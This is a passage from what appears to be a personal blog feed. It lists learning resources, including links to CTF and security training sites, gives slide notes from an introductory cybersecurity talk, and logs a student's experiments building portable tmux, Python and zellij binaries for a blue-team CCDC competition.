<h2 class="anchored" data-anchor-id="calculus">Calculus</h2>
<p><a href="https://math.libretexts.org/Bookshelves/Calculus/Calculus_(OpenStax)">Openstax (on Libretexts)</a></p>
<p><a href="https://en.wikibooks.org/wiki/Calculus">Wikibooks</a> — Good, but doesn’t have root test, only ratio.</p>
<p><a href="https://tutorial.math.lamar.edu/Classes/CalcI/CalcI.aspx">Paul’s Math Notes</a></p>
</section>
<section id="linear-algebra" class="level2">
<h2 class="anchored" data-anchor-id="linear-algebra">Linear Algebra</h2>
<p><a href="https://hefferon.net/linearalgebra/">Heffron</a></p>
<p><a href="https://math.libretexts.org/Bookshelves/Linear_Algebra/A_First_Course_in_Linear_Algebra_(Kuttler)">Libretexts (Kuttler)</a></p>
<p><a href="https://math.libretexts.org/Bookshelves/Linear_Algebra/Map%3A_Linear_Algebra_(Waldron_Cherney_and_Denton)">Libretexts Denton, Cherney</a></p>
<ul>
<li><a href="https://www.math.ucdavis.edu/~linear/">Original Page</a></li>
</ul>
<p><a href="https://understandinglinearalgebra.org/home.html">Understanding Linear Algebra</a></p>
<p><a href="https://textbooks.math.gatech.edu/ila/">Interactive Linear Algebra</a></p>
<p><a href="https://opentext.uleth.ca/linalg.html">Misc set</a></p>
</section>
<section id="discrete-structuresmathmatics" class="level2">
<h2 class="anchored" data-anchor-id="discrete-structuresmathmatics">Discrete Structures/Mathmatics</h2>
<p><a href="https://en.wikibooks.org/wiki/Mathematical_Proof/Methods_of_Proof">Wikibooks Math Proofs</a></p>
</section>
</section>
<section id="computer-engineering" class="level1">
<h1>Computer Engineering</h1>
<p><a href="https://www.nand2tetris.org/">Nand2tetris</a></p>
</section>
<section id="college-courses-or-equivalent" class="level1">
<h1>College Courses or Equivalent:</h1>
<ul>
<li>https://github.com/ossu/computer-science</li>
<li>https://github.com/ForrestKnight/open-source-cs</li>
<li></li>
</ul>
</section>
<section id="nix" class="level1">
<h1>Nix</h1>
<details>
<summary>
Expand/Collapse
</summary>
<p><a href="https://github.com/justinwoo/nix-shorts/" class="uri">https://github.com/justinwoo/nix-shorts/</a><br> <a href="https://nix.ug/" class="uri">https://nix.ug/</a><br> <a href="https://teu5us.github.io/nix-lib.html#nix-builtin-functions" class="uri">https://teu5us.github.io/nix-lib.html#nix-builtin-functions</a><br> <a href="https://nixos.org/manual/nix/stable/language/operators.html#has-attribute" class="uri">https://nixos.org/manual/nix/stable/language/operators.html#has-attribute</a><br> <a href="https://book.divnix.com/" class="uri">https://book.divnix.com/</a><br> <a href="https://ianthehenry.com/posts/how-to-learn-nix/" class="uri">https://ianthehenry.com/posts/how-to-learn-nix/</a><br> <a href="https://noogle.dev/" class="uri">https://noogle.dev/</a><br> <a href="https://nix-community.github.io/awesome-nix/#learning" class="uri">https://nix-community.github.io/awesome-nix/#learning</a><br> <a href="https://www.youtube.com/@jonringer117" class="uri">https://www.youtube.com/@jonringer117</a><br> <a href="https://summer.nixos.org/" class="uri">https://summer.nixos.org/</a><br> <a href="https://nix.camp/" class="uri">https://nix.camp/</a><br> <a href="https://nixlang.wiki/" class="uri">https://nixlang.wiki/</a></p>
<p>Below is stuff I don’t like as much:</p>
<p><a href="https://zero-to-nix.com/" class="uri">https://zero-to-nix.com/</a><br> <a href="https://nix.dev/" class="uri">https://nix.dev/</a><br> <a href="https://nixos.wiki/" class="uri">https://nixos.wiki/</a><br> <a href="https://nixos.org/guides/nix-pills/" class="uri">https://nixos.org/guides/nix-pills/</a><br></p>
</details>
</section>
<section id="hacking" class="level1">
<h1>Hacking</h1>
<p><a href="https://github.com/Adamkadaban/CTFs" class="uri">https://github.com/Adamkadaban/CTFs</a> — Mega list of CTF’s and the like to get started.</p>
<p><a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/" class="uri">https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</a> — Intro box to Vulnhub. In general, that site has many vulnerable virtual machines for learning penetration testing.</p>
<details>
<summary>
<p>Expand/Collapse</p>
<p><a href="https://www.isc2.org/landing/1MCC?utm_source=isc2&amp;utm_medium=textlink&amp;utm_campaign=GBL-CC-1M-DG&amp;utm_term=bundlepage&amp;utm_content=awareness">https://www.isc2.org/</a></p>
<p><a href="https://overthewire.org/wargames/">https://overthewire.org/wargames/</a></p>
<p><a href="https://www.cyberstartamerica.org/">https://www.cyberstartamerica.org/</a></p>
<p><a href="http://ctfs.github.io/resources/topics/web/http/README.html">http://ctfs.github.io/resources/topics/web/http/README.html</a></p>
<p><a href="https://hackgame.chaurocks.com/level6">https://hackgame.chaurocks.com/level6</a></p>
<p><a href="https://www.sandiego.gov/cyber-lab">https://www.sandiego.gov/cyber-lab</a></p>
<p><a href="https://www.picoctf.org/">https://www.picoctf.org/</a></p>
<p><a href="https://grow.google/intl/ALL_ca/certificates/cybersecurity/#?modal_active=none">https://grow.google/intl/ALL_ca/certificates/cybersecurity/#?modal_active=none</a></p>
<p><a href="https://exploit.education/protostar/">https://exploit.education/protostar/</a></p>
<p><a href="https://pwn.college/">https://pwn.college/</a></p>
<ul>
<li>This is the site for many cybersecurity courses at Arizona State University. They also have an associated <a href="https://www.twitch.tv/pwncollege">twitch stream</a>, where they stream classes as they happen.</li>
</ul>
<p><a href="https://www.cyber-fasttrack.org/">https://www.cyber-fasttrack.org/</a></p>
<p><a href="https://book.hacktricks.xyz/welcome/readme">https://book.hacktricks.xyz/welcome/readme</a></p>
</summary></details>
</section>
<section id="cryptography" class="level1">
<h1>Cryptography</h1>
<details>
<summary>
Expand/Collapse
</summary>
<p>https://gotchas.salusa.dev/GettingStarted.html https://soatok.blog/2020/06/10/how-to-learn-cryptography-as-a-programmer/ https://cryptopals.com/ https://cryptohack.org/ https://www.youtube.com/watch?v=iqSMRO78UD0&amp;list=PLUl4u3cNGP61EZllk7zwgvPbI4kbnKhWz</p>
</details>
</section>
<section id="cert-preparation" class="level1">
<h1>Cert Preparation</h1>
<ul>
<li><p><a href="https://github.com/connectans/awesome-CISSP-CCSP/blob/main/asset/The%20sunflower%20CISSP%20Summary%20Version%202.0.pdf" class="uri">https://github.com/connectans/awesome-CISSP-CCSP/blob/main/asset/The%20sunflower%20CISSP%20Summary%20Version%202.0.pdf</a></p></li>
<li></li>
</ul>
</section>
<section id="chess" class="level1">
<h1>Chess</h1>
<p><a href="https://lichess.org">Lichess</a> — an open source, chess website with many resources to learn chess such as puzzles that guide you through the basics or “studies” that guide openenings.</p>
<ul>
<li><a href="https://lichess.org/learn">Basics</a></li>
<li><a href="https://lichess.org/study">Opening Studies</a></li>
</ul>
<p><a href="https://listudy.org/en/features/blind-tactics">Blindfold tactics</a> — Very, very good for practicing calculation.</p>


</section>

 ]]></description>
  <category>guides</category>
  <guid>./guides/learn-linux/</guid>
  <pubDate>Sat, 15 Feb 2025 08:00:00 GMT</pubDate>
</item>
<item>
  <title>Introduction to Cybersecurity</title>
  <dc:creator>Jeffrey Fonseca</dc:creator>
  <link>./talks/intro-cyber/</link>
  <description><![CDATA[ 




<p>This is a presentation for introducing new people to cybersecurity.</p>
<p>Below is the same presentation, rendered to html with the slide titles as headers.</p>
<p>If you want to see the presentation in slides form, click the “RevealJS” format on the right, under “Other formats”.</p>
<section id="osi-model-and-our-name" class="level1">
<h1>OSI Model and Our Name</h1>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><img src="https://blog.joemanna.com/wp-content/uploads/1-tutorial-osi-7-layer-model.gif" class="img-fluid figure-img"></p>
<figcaption>Image of the 7 OSI layers</figcaption>
</figure>
</div>
</section>
<section id="cybersecurity-is" class="level1">
<h1>Cybersecurity is:</h1>
<ul>
<li>Methods used to secure systems from malice or human error</li>
<li>Backups!</li>
</ul>
</section>
<section id="types-of-machines" class="level1">
<h1>Types of Machines</h1>
<ul>
<li>Servers: Run things like web pages or game servers</li>
<li>Desktops: Machines you normally interact with</li>
</ul>
</section>
<section id="common-methodologies-for-servers" class="level1">
<h1>Common Methodologies for Servers</h1>
<ul>
<li>Limit services in use (attack surface)</li>
<li>“Harden” services</li>
<li>“Agent” software, which monitors systems</li>
</ul>
</section>
<section id="methodologies-for-desktops" class="level1">
<h1>Methodologies for Desktops</h1>
<ul>
<li>Restrict downloading of software</li>
<li>“Agent” software to monitor systems</li>
<li>Education of users</li>
</ul>
</section>
<section id="operating-systems" class="level1">
<h1>Operating Systems</h1>
<ul>
<li>Windows, Linux, and Mac</li>
<li>Windows and Mac are common for desktops</li>
<li>Linux is common for servers</li>
</ul>
</section>
<section id="overthewire-bandit" class="level1">
<h1>Overthewire Bandit</h1>
<ul>
<li><a href="https://overthewire.org/wargames/bandit/" class="uri">https://overthewire.org/wargames/bandit/</a></li>
<li>Good place to get started for Linux related things</li>
<li>All answers to the challenges can be found in the built in documentation accessible via the <code>man</code> command.</li>
</ul>
</section>
<section id="web-based-terminals" class="level1">
<h1>Web Based Terminals:</h1>
<ul>
<li><a href="https://shell.segfault.net" class="uri">https://shell.segfault.net</a></li>
<li><a href="https://sshwifty-demo.nirui.org/" class="uri">https://sshwifty-demo.nirui.org/</a></li>
<li><a href="https://ssheasy.com/" class="uri">https://ssheasy.com/</a></li>
</ul>
</section>
<section id="interesting-youtubers" class="level1">
<h1>Interesting Youtubers</h1>
<ul>
<li><a href="https://www.youtube.com/watch?v=K4WPng0VJsM">SoBatistaCyber’s Overthewire walkthrough</a>
<ul>
<li>Please don’t use this…</li>
</ul></li>
<li><a href="https://www.youtube.com/@lauriewired">LaurieWired</a></li>
<li></li>
</ul>
</section>
<section id="futher-resources" class="level1">
<h1>Futher Resources</h1>
<ul>
<li><a href="https://www.womeninlinux.org/" class="uri">https://www.womeninlinux.org/</a>
<ul>
<li>There is a big conference called SCaLE, which happens yearly in March</li>
</ul></li>
<li></li>
</ul>


</section>

<div id="quarto-appendix" class="default"><section class="quarto-appendix-contents" id="quarto-reuse"><h2 class="anchored quarto-appendix-heading">Reuse</h2><div class="quarto-appendix-contents"><div><a rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a></div></div></section></div> ]]></description>
  <category>talks</category>
  <guid>./talks/intro-cyber/</guid>
  <pubDate>Mon, 10 Feb 2025 08:00:00 GMT</pubDate>
</item>
<item>
  <title>Portable executable experiments for CCDC</title>
  <link>./playground/ape-experiments/</link>
  <description><![CDATA[ 




<p>The college I am going to has a team that comeptes in a competition called <a href="https://en.wikipedia.org/wiki/National_Collegiate_Cyber_Defense_Competition">CCDC</a>, which is a blue team cybersecurity competition. It involves securing misconfigured, outdated OS’s and services, while being asked to do tasks called “injects”, and protecting a highly vulnerable environment from “red teamers” — competition organizers who play the role of a hypothetical attacker.</p>
<p>One of the big problems encountered in CCDC is the portability of applications. Competitors will be asked to work across a variety of Linux distros, of various types and various package versions, and even across the BSD versions. Of course, sometimes the solution is simple: install your tools, like python or tmux, from the package manager on every Linux/BSD OS.</p>
<p>The second problem is that the organizers of the competition may break our package managers. Deleting repos, or giving us a distro without a package manager, or giving us End-Of-Life distributions, with dead repositories.</p>
<p>And also, we aren’t allowed to do a distribution release upgrade. So we can’t go from CentOS 8 to CentOS Stream or other things like that. We also aren’t allowed to replace non-containerized scored services with containers. We also aren’t allowed to replace scored services with another application of the same type, so no replacing Apache with Caddy.</p>
<p>However, we can use static executables to replace services, and there are real limits on what kind of utilities we can deploy, other than resources usage (Linux/BSD machines usually have 2 gigabytes of ram).</p>
<p>I was looking into portable executables, to mitigate some of the problems and restrictions. I would like to have a portable version of python, so that ansible playbooks relating to firewall automation and backups can be run as soon as possible, and also a portable terminal multiplexer, so that our team members can collaborate directly. I would also like portable (statically compiled) versions of some of the services, so that we can replace them in place, rather than being forced to rely on a package manager that may not work.</p>
<section id="apecosmo" class="level1">
<h1>Ape/Cosmo</h1>
<p><a href="https://justine.lol/cosmopolitan/index.html">Cosmopolitan</a> is a project that turns C into build once, run anywhere language. It works by creating a fat binary that contains code for all other operating systems, including UEFI, and then dynamically figuring out where it is being run.</p>
<p>There are some precompiled binaries for ape as well:</p>
<ul>
<li><a href="https://github.com/ahgamut/superconfigure/releases" class="uri">https://github.com/ahgamut/superconfigure/releases</a></li>
<li><a href="https://cosmo.zip/pub/cosmos/bin/" class="uri">https://cosmo.zip/pub/cosmos/bin/</a></li>
</ul>
<p>Some of these tools are very interesting, in particular <code>tmux</code> and <code>python</code>. Ansible requires python to be on the machines, but it can be difficult to get python on a machine, especially if the package manager is broken. I can easily imagine something like:</p>
<p><code>cat staticpython | ssh hostname "cat &gt; remotestaticssh"</code></p>
<p>The above would enable us to get a version of staticly compiled python on anything with ssh, and only ssh needed. There are also some <a href="https://superuser.com/questions/291423/how-to-copy-a-file-without-using-scp-inside-an-ssh-session">other ways to do it</a>.</p>
<p>I download an actually portable version of tmux and python, and attempt to run them (the test is to see if they still work without glibc, which is often a limitation of portability for many other portable binaries).</p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb1-1">[moonpie@lizard apeb]$ ./python</span>
<span id="cb1-2">0088:err:sync:RtlpWaitForCriticalSection section 00006FFFFFFAC440 "../wine-staging/dlls/ntdll/loader.c: loader_section" wait timed out in thread 0088, blocked by 007c, retrying (60 sec)</span>
<span id="cb1-3">0120:fixme:file:server_get_file_info Unsupported info class 1c</span>
<span id="cb1-4">0120:fixme:file:NtFsControlFile FSCTL_GET_REPARSE_POINT semi-stub</span>
<span id="cb1-5">0120:fixme:file:server_get_file_info Unsupported info class 1c</span>
<span id="cb1-6">0120:fixme:file:server_get_file_info Unsupported info class 1c</span>
<span id="cb1-7">Python 3.12.3 (main, Aug  3 2024, 10:18:33) [GCC 14.1.0] on linux</span>
<span id="cb1-8">Type "help", "copyright", "credits" or "license" for more information.</span>
<span id="cb1-9">0120:fixme:file:server_get_file_info Unsupported info class 1c</span>
<span id="cb1-10">&gt;&gt;&gt; exit(_</span>
<span id="cb1-11">^C0124:err:virtual:virtual_setup_exception stack overflow 1280 bytes addr 0x952cd2 stack 0x1300b00 (0x1300000-0x1301000-0x1400000)</span>
<span id="cb1-12">^C012c:err:virtual:virtual_setup_exception stack overflow 1280 bytes addr 0x952cd2 stack 0x1400b00 (0x1400000-0x1401000-0x1500000)</span>
<span id="cb1-13">^C0134:err:virtual:virtual_setup_exception stack overflow 1280 bytes addr 0x952cd2 stack 0x1500b00 (0x1500000-0x1501000-0x1600000)</span>
<span id="cb1-14">^C013c:err:virtual:virtual_setup_exception stack overflow 1280 bytes addr 0x952cd2 stack 0x1600b00 (0x1600000-0x1601000-0x1700000)</span>
<span id="cb1-15">^C0144:err:virtual:virtual_setup_exception stack overflow 1280 bytes addr 0x952cd2 stack 0x1700b00 (0x1700000-0x1701000-0x1800000)</span></code></pre></div>
<p>My Arch Linux install attempts to use wine to load up the python program. There are also issues quitting, and I end up having to use pkill to kill python. This is because my OS attempts to use <a href="https://en.wikipedia.org/wiki/Binfmt_misc">binfmt_misc</a>, and finds out that Wine is an acceptable program for launching ape binaries. ape binaries are not designed to run under wine, this behavior happens instead.</p>
<p>The way to avoid this is to use the <a href="https://justine.lol/apeloader/">ape loader</a>.</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb2-1">[moonpie@lizard apeb]$ ./ape-x86_64.elf ./python</span>
<span id="cb2-2">Python 3.12.3 (main, Aug  3 2024, 10:18:33) [GCC 14.1.0] on linux</span>
<span id="cb2-3">Type "help", "copyright", "credits" or "license" for more information.</span>
<span id="cb2-4">&gt;&gt;&gt;</span>
<span id="cb2-5">``</span>
<span id="cb2-6"></span>
<span id="cb2-7">And this works. But, although there is also a version of python distributed with many python libraries included, called `pypack1`, it doesn't contain some crucial python packages that I may need for ansible administration of systems, like sql manipulation tools. </span>
<span id="cb2-8"></span>
<span id="cb2-9">```{.default}</span>
<span id="cb2-10">[moonpie@lizard apeb]$ ./ape-x86_64.elf ./python -m venv venv</span>
<span id="cb2-11">Error: Command '['/home/moonpie/vscode/test/apeb/venv/bin/python', '-m', 'ensurepip', '--upgrade', '--default-pip']' returned non-zero exit status 1.</span></code></pre></div>
<p>Yeah. I’m not too worried, because I wrote my roles so that the databse manipulation can also be done remotely, from a playbook running on localhost, but it would be simpler if everything can be run on the remote systems.</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1">[moonpie@lizard apeb]$ ./ape-x86_64.elf ./tmux</span>
<span id="cb3-2">[moonpie@lizard apeb]$ ./ape-x86_64.elf ./tmux -h</span>
<span id="cb3-3">tmux: unknown option -- h</span>
<span id="cb3-4">usage: tmux [-2CDlNuvV] [-c shell-command] [-f file] [-L socket-name]</span>
<span id="cb3-5">            [-S socket-path] [-T features] [command [flags]]</span></code></pre></div>
<p>And tmux just won’t load, although it will print the help output. I find this very weird, as I could get tmux to load earlier, but not now. It doesn’t load on my host system, or in an Debian or Alpine container.</p>
<p>This only seems to apply to the ape tmux, as tmux installed by apt in a debian container doesn’t have this issue, and then after that, tmux is able to start sessions normally, but then it can’t again after I kill all sessions. At least this isolates it to an issue with ape.</p>
<p>It could just be a bug of some sort, but the package version only updated 3 days ago from now (August 6th), so those haven’t changed.</p>
<p>The weirdest thing is that the ape tmux is actually able to work normally… but only after I launch a session via non-ape tmux. And then, one I kill all tmux sessions, then it stops working again.</p>
<p>It seems like the ape tmux is having trouble starting the server:</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb4-1">/stuff # ape ./tmux start-server</span>
<span id="cb4-2">/stuff #</span>
<span id="cb4-3">/stuff # ape ./tmux ls</span>
<span id="cb4-4">no server running on /tmp/tmux-0/default</span></code></pre></div>
<p>I found a <a href="https://github.com/tmux/tmux/issues/736">half relevant issue</a>, but the failed solution gives me more answers:</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb5-1">/stuff # ape ./tmux new-session -t testing -d</span>
<span id="cb5-2">create window failed: fork failed: Operation not permitted</span></code></pre></div>
<p>I eventually made a post on the redbean discord server, and uploaded my <a href="https://gist.github.com/moonpiedumplings/809dcc89cfe289f8341aae85069a57e1">strace to a github gist</a>. I’ll wait to see if anyone replies.</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb6-1">[moonpie@lizard apeb]$ ./ape-x86_64.elf ./tmux new-session -d -vv</span>
<span id="cb6-2">no server running on /tmp/tmux-1000/default</span></code></pre></div>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb7-1">/stuff # ./ape-x86_64.elf ./tmux new-session -d -vv</span>
<span id="cb7-2">no server running on /tmp/tmux-0/default</span></code></pre></div>
<p>So tmux can be ran with -vv for something more verbose.</p>
<p>This might also be a tmux bug, since the version of tmux provided by ape/cosmo is 3.3a, rather than the latest 3.4, however, the nix bundled tmux also has this issue, and nix has 3.4 of tmux.</p>
<p>I played around with attempting to build newer versions of tmux from the <a href="https://github.com/ahgamut/superconfigure?tab=readme-ov-file#how-can-i-build-these-locally">superconfigure</a> github repo, but their instructions don’t seem to work. The scripts assume Ubuntu 22 LTS, although I was only able to find that out after looking at what distro was used in their github actions.</p>
<section id="openbsd" class="level2">
<h2 class="anchored" data-anchor-id="openbsd">Openbsd</h2>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb8-1">[vagrant@openbsd7 ~]$ ./ape ./python</span>
<span id="cb8-2">Python 3.12.3 (main, Aug  3 2024, 10:18:33) [GCC 14.1.0] on linux</span>
<span id="cb8-3">Type "help", "copyright", "credits" or "license" for more information.</span>
<span id="cb8-4">&gt;&gt;&gt;</span>
<span id="cb8-5">[vagrant@openbsd7 ~]$ ./ape ./tmux new-ession -d -vv</span>
<span id="cb8-6">no server running on /tmp/tmux-1000/default</span></code></pre></div>
</section>
<section id="netbsd" class="level2">
<h2 class="anchored" data-anchor-id="netbsd">NetBSD</h2>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb9-1">[vagrant@netbsd8 ~]$ ./ape ./python</span>
<span id="cb9-2">Python 3.12.3 (main, Aug  3 2024, 10:18:33) [GCC 14.1.0] on linux</span>
<span id="cb9-3">Type "help", "copyright", "credits" or "license" for more information.</span>
<span id="cb9-4">&gt;&gt;&gt;</span>
<span id="cb9-5">[vagrant@netbsd8 ~]$ ./ape ./tmux new-session -d -vv</span>
<span id="cb9-6">no server running on /tmp/tmux-1000/default</span></code></pre></div>
<p>Vim executes successfully as well. It’s able to execute without the ape interpeter, but python crashes when I try to do that.</p>
</section>
<section id="dragonflybsd" class="level2">
<h2 class="anchored" data-anchor-id="dragonflybsd">DragonflyBSD</h2>
<p>We’ve seen this FreeBSD fork in the competition environment. But, DragonFlyBSD was forked from FreeBSD 4.8, which was nearly 21 years ago. At this point, they have diverged to the point where ape binaries do not run on Dragonfly. Cosmo does not officially support DragonflyBSD, and it’s highly likely that there are other differences, like the <code>pf</code> firewall configuration file having different syntax.</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb10-1">[vagrant@dragonflybsd6 ~]$ ./ape ./python</span>
<span id="cb10-2">ELF binary type "9" not known.</span></code></pre></div>
</section>
<section id="freebsd" class="level2">
<h2 class="anchored" data-anchor-id="freebsd">FreeBSD</h2>
<p>I intend to test, but vagrant networking is giving me trouble. Cosmo should work with FreeBSD though.</p>
</section>
</section>
<section id="nix-bundle" class="level1">
<h1>Nix bundle</h1>
<p><code>nix bundle nixpkgs#programname</code> is a command that bundles a program into a self extracting archive that uses proot to run itself. A big problem with nix bundle is that it mostly only works on Linux, and relying on proot makes it less portable compared to ape. <a href="https://nix.dev/manual/nix/2.13/command-ref/new-cli/nix3-bundle">Here is the official manual</a>… on an unofficial site.</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb11-1">[moonpie@lizard apeb]$ nix bundle nixpkgs#zellij</span>
<span id="cb11-2">[moonpie@lizard apeb]$ ls -la zellij</span>
<span id="cb11-3">lrwxrwxrwx 1 moonpie moonpie 47 Aug  6 22:28 zellij -&gt; /nix/store/5d5fi0x4g7v33m7jscxwjijaxi3lg2kp-arx</span></code></pre></div>
<p>One thing that is mildly annoying is that nix builds stuff in the nix store, and then symlinks to it from the outside, meaning you have to copy out the binary first.</p>
<p>The first thing I tried to do was bundle zellij and tmux, and funnily enough, they run into the exact same issue as ape. If I launch a zellij or tmux session using a non-ape, non nix-bundled session, first, then I can use the nix bundled zellij or tmux normally.</p>
</section>
<section id="guix-pack" class="level1">
<h1>Guix pack</h1>
<p>Guix pack is different. Rather than doing self extracting or staticly compiled executables, it generates a tarball (or docker image, but I’m focused on tarball), which can be extracted and has the programs with a vendored dependency.</p>
<p>I found a <a href="https://hub.docker.com/r/metacall/guix">docker container for guix</a>, which is good because I’d rather run guix entirely in a podman container in my home volume, to avoid snapshotting guix in btrfs snapshots of the root subvolume.</p>
<p><code>podman run -it --rm -v ".:/stuff" --privileged</code></p>
<p>I had to run it with –privileged, otherwise the guix builder fails.</p>
<p>Once inside, the <code>guix pack</code> command packs programs into a tarball. <a href="https://guix.gnu.org/manual/en/html_node/Invoking-guix-pack.html">Documentation</a></p>
<p><code>guix pack -RR tmux</code> generates a tarball… but I’m struggling to run it outside the store.</p>
</section>
<section id="appimage" class="level1">
<h1>Appimage</h1>
<p>Appimages are good, but with a few caveats: They only work on Linux, and they require fuse2 (not fuse3, but fuse2) to run, and they rely on the same version of glibc.</p>
<p>There are some <a href="https://github.com/tmux/tmux/wiki/Installing#appimage-package">prebuilt appimages for tmux</a> and it works fine after I install fuse2.</p>
</section>
<section id="static-compilation" class="level1">
<h1>Static Compilation</h1>
<section id="tmux" class="level2">
<h2 class="anchored" data-anchor-id="tmux">Tmux</h2>
<p><a href="https://github.com/tmux/tmux/wiki/Installing">tmux has instructions for installing</a>.</p>
<p><code>apk add git gcc musl-dev openssl-dev openssl-libs-static openssl ncurses-terminfo</code></p>
<p>After these packages are installed, compiling tmux staticly will work. (it should be noted that the instructions assume you use the relase tarball, rather than directly from the source code).</p>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb12-1">./configure --enable-static</span>
<span id="cb12-2"></span>
<span id="cb12-3">make</span></code></pre></div>
<p>However:</p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb13-1">/stuff # ./stmux</span>
<span id="cb13-2">can't find terminfo database</span></code></pre></div>
<p>The staticly compiled tmux doesn’t include ncurses and terminfo libraries. After installing <code>ncurses-terminfo</code> then it works fine.</p>
<p>Apparently it’s possible to staticly bundle ncurses, libevent, and tmux, but it’s an even more involved process. Users must compile ncurses, which generates .a files and then link those to tmux when compiling using LIBS and -l flag to link it.</p>
</section>
<section id="zellij" class="level2">
<h2 class="anchored" data-anchor-id="zellij">Zellij</h2>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb14-1">git clone https://github.com/zellij-org/zellij/</span>
<span id="cb14-2"></span>
<span id="cb14-3">podman run -it --rm -v "./zellij:/zellij" docker.io/library/rust:alpine3.18</span>
<span id="cb14-4"></span>
<span id="cb14-5">apk add openssl1.1-compat openssl1.1-compat-dev openssl1.1-compat-libs-static musl-utils musl-dev protoc # but only for alpine 3.18</span>
<span id="cb14-6"></span>
<span id="cb14-7">alternatively: apk add openssl openssl-libs-static openssl-dev musl-utils musl-dev protoc</span>
<span id="cb14-8"></span>
<span id="cb14-9">cd /zellij</span>
<span id="cb14-10"></span>
<span id="cb14-11">rustup target add x86_64-unknown-linux-musl</span>
<span id="cb14-12"></span>
<span id="cb14-13">rustup target add wasm32-wasi</span>
<span id="cb14-14"></span>
<span id="cb14-15">RUSTFLAGS="-C target-feature=+crt-static" OPENSSL_NO_VENDOR="1" cargo build --target x86_64-unknown-linux-musl  </span>
<span id="cb14-16"></span>
<span id="cb14-17"></span>
<span id="cb14-18">/stuff/zellij # RUSTFLAGS="-C target-feature=+crt-static" OPENSSL_NO_VENDOR="1" cargo xtask build</span>
<span id="cb14-19">error: cannot produce proc-macro for `prost-derive v0.11.9` as the target `x86_64-unknown-linux-musl` does not support these crate types</span></code></pre></div>
<p>This still crashes for now, but I need to figure out how to compile it if I want to target other BSD’s.</p>
<p><code>error: couldn't read /stuff/zellij/zellij-utils/../target/wasm32-wasi/debug/compact-bar.wasm: No such file or directory (os error 2)</code></p>
<p>Let’s try debian, since it seems they do their official builds — even musl ones — on ubuntu.</p>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb15-1"></span>
<span id="cb15-2">podman run -it --rm -v "./zellij:/zellij" docker.io/library/rust:bookworm</span>
<span id="cb15-3"></span>
<span id="cb15-4">apt update &amp;&amp; apt install musl-tools protobuf-compiler</span>
<span id="cb15-5"></span>
<span id="cb15-6">rustup target add x86_64-unknown-linux-musl</span>
<span id="cb15-7"></span>
<span id="cb15-8">rustup target add wasm32-wasi</span>
<span id="cb15-9"></span>
<span id="cb15-10">cargo xtask ci cross x86_64-unknown-linux-musl   # This crashes</span>
<span id="cb15-11"></span>
<span id="cb15-12">cargo build --verbose --release --target x86_64-unknown-linux-musl # This works</span>
<span id="cb15-13"></span>
<span id="cb15-14">rustup target add x86_64-unknown-netbsd</span>
<span id="cb15-15"></span>
<span id="cb15-16">cargo build --verbose --release --target x86_64-unknown-netbsd</span>
<span id="cb15-17"> error occurred: Failed to find tool. Is `x86_64--netbsd-gcc` installed?</span></code></pre></div>
<p>So it seems like cross compilation support isn’t too good.</p>
<p>Then I tried with the alpine container in the same directory:</p>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb16-1"></span>
<span id="cb16-2">apk add openssl openssl-libs-static openssl-dev musl-utils musl-dev protoc gcc-cross-embedded</span>
<span id="cb16-3"></span>
<span id="cb16-4">rustup target add wasm32-wasi</span>
<span id="cb16-5"></span>
<span id="cb16-6">rustup target add x86_64-unknown-netbsd</span>
<span id="cb16-7"></span>
<span id="cb16-8">RUSTFLAGS="-C target-feature=+crt-static" OPENSSL_NO_VENDOR="1" OPENSSL_INCLUDE_DIR="/usr/include/openssl" OPENSSL_LIB_DIR="/usr/lib" cargo build --target x86_64-unknown-freebsd</span></code></pre></div>
<p>This is much closer, but doesn’t work.</p>
<div class="sourceCode" id="cb17" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb17-1">note: /usr/lib/gcc/x86_64-alpine-linux-musl/13.2.1/../../../../x86_64-alpine-linux-musl/bin/ld: cannot find -lexecinfo: No such file or directory</span>
<span id="cb17-2">          /usr/lib/gcc/x86_64-alpine-linux-musl/13.2.1/../../../../x86_64-alpine-linux-musl/bin/ld: cannot find -lkvm: No such file or directory</span>
<span id="cb17-3">          /usr/lib/gcc/x86_64-alpine-linux-musl/13.2.1/../../../../x86_64-alpine-linux-musl/bin/ld: cannot find -lmemstat: No such file or directory</span>
